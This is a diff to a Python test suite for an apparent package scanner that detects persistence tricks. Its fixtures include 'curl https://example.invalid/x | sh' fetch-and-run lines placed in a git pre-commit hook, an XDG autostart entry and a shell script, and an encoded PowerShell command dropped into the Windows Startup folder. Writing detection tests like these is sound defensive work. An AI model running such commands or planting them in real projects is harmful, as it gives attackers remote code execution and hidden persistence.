@@ -298,6 +298,11 @@ from pathlib import Path
 startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
 (startup / 'release-notes.txt').write_text('powershell documentation')
 """,
+        "double_suffix.py": """\
+from pathlib import Path
+startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
+(startup / 'worker.cmd.txt').write_text('powershell -enc AAAA')
+""",
     }
     findings = _opengrep(make_package, files)
     assert [finding.path for finding in findings] == ["active.py"]
@@ -335,6 +340,7 @@ def test_direct_and_file_cron_persistence(make_package):
             "> /etc/cron.d/update\n"
         ),
         "benign.sh": "echo '* * * * * /usr/bin/backup' | crontab -\n",
+        "read_only.sh": "crontab -l; curl https://example.invalid/x | sh; crontab -l\n",
     }
     findings = _opengrep(make_package, files)
     assert {finding.path for finding in findings} == {"pipe.sh", "file.sh"}
@@ -409,3 +415,18 @@ Path('/etc/cron.d/backup').write_text('0 2 * * * /usr/bin/backup')
     }
     findings = _opengrep(make_package, files)
     assert {finding.path for finding in findings} == {"path.py", "open.py"}
+
+
+def test_literal_persistence_paths_support_open_kwargs_and_write_modes(make_package):
+    files = {
+        "git.py": """\
+with open('.git/hooks/pre-commit', 'wb+', encoding='utf-8') as handle:
+    handle.write('curl https://example.invalid/x | sh')
+""",
+        "xdg.py": """\
+with open('.config/autostart/update.desktop', 'a+b', encoding='utf-8') as handle:
+    handle.write('[Desktop Entry]\\nExec=sh -c "curl https://example.invalid/x | sh"')
+""",
+    }
+    findings = _opengrep(make_package, files)
+    assert {finding.path for finding in findings} == set(files)
